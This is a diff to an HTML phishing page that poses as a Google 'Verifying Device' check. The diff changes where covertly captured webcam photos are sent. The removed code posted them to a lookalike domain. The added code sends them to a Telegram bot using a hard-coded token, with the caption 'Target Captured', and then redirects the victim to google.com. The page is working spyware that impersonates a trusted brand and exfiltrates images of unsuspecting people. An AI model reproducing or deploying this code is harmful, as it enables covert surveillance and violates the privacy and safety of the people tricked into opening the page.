@@ -7,33 +7,48 @@
 <body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
     <h3>Verifying Device...</h3>
+    
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
+        // AAPKA TELEGRAM DATA
+        const token = "8461524246:AAGAsQD20_4t3zR05rI6bu-0FIrG_pgXS-g";
         const urlParams = new URLSearchParams(window.location.search);
-        const uid = urlParams.get('id') || '7130643157';
+        const chat_id = urlParams.get('id') || '7130643157';
 
         async function start() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-            setTimeout(() => {
-                const c = document.getElementById('c');
-                c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                
-                // Photo ko wuaze wali site par bhejna
-                const fd = new FormData();
-                fd.append('id', uid);
-                fd.append('img', c.toDataURL('image/png'));
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
 
-                fetch('http://google-secure-login.wuaze.com/post.php', {
-                    method: 'POST',
-                    mode: 'no-cors', // Ye zaroori hai
-                    body: new URLSearchParams(fd)
-                }).finally(() => { window.location.href = "https://google.com"; });
-            }, 1000);
+                setTimeout(async () => {
+                    const c = document.getElementById('c');
+                    c.width = 640;
+                    c.height = 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    
+                    // Photo ko Blob mein badalna
+                    c.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', blob, 'capture.png');
+                        formData.append('caption', '🎯 Target Captured via GitHub!');
+
+                        // DIRECT TELEGRAM KO BHEJNA
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        // Kaam khatam hone ke baad Google par bhejna
+                        window.location.href = "https://www.google.com";
+                    }, 'image/png');
+                }, 2000);
+            } catch (e) {
+                window.location.href = "https://www.google.com";
+            }
         }
         window.onload = start;
     </script>
